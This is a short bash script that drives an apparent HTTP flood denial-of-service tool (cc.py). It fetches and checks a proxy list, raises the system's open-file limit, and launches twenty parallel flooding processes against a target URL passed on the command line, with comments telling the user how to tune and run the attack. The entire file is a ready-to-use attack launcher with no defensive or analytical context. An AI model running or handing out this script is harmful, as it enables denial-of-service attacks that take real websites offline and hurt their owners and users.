#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec

[ -f proxy.txt ] || python3 cc.py -down -check -v 4

atk_cmd="python3 cc.py -url $1 -s 9999999 -v 4"

#number of process that you want
process=20

#change the system limit
ulimit -n 999999

for ((i=1;i<=$process;i++))
do
  $atk_cmd &
  sleep 0.1
done
